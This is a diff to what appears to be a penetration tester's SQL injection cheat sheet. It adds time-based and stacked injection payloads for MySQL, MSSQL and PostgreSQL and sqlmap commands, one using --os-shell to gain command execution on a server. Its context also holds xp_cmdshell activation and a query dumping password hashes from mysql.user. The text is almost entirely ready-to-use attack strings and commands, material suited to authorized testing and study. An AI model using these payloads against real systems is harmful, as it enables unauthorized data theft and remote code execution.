@@ -48,6 +48,8 @@ show tables;
 SELECT * FROM table1;
 SELECT user, authentication_string FROM mysql.user WHERE user = 'user01';
 
+### Time Delay
+SELECT SLEEP(10)
 
 ##############
 ####### MSSQL
@@ -68,6 +70,29 @@ EXECUTE sp_configure 'xp_cmdshell', 1;
 EXECUTE xp_cmdshell 'whoami';
 RECONFIGURE;
 
+### Time Delay
+WAITFOR DELAY '0:0:10'
+
+####################
+###### POSTGRE
+####################
+
+https://hacktricks.boitatech.com.br/pentesting-web/sql-injection/postgresql-injection
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
+
+';SELECT PG_SLEEP(5)--
+# Stack based injection
+
+' AND 4050=(SELECT 4050 FROM PG_SLEEP(5))-- RJlz
+# Blind injection
+
+####################
 ### SQLMap ###
+####################
+-vvv #show payloads used
+
 sqlmap -u http://10.0.0.1/ --random-agent --cookie='PHPSESSID=g1ds2c7...ikr3frffp8' --data='uid=teste&password=testepass' -p uid -D insidedb -T insidetable --dump
 $ Using POST with session cookie and body data, -D set DataBase and T set Table
+
+sqlmap -v -u http://$target/class.php --data 'weight=100&height=190&age=34&gender=Male&email=asdf%40asdf.com' --random-agent -p height --os-shell
+$ Get exec on server
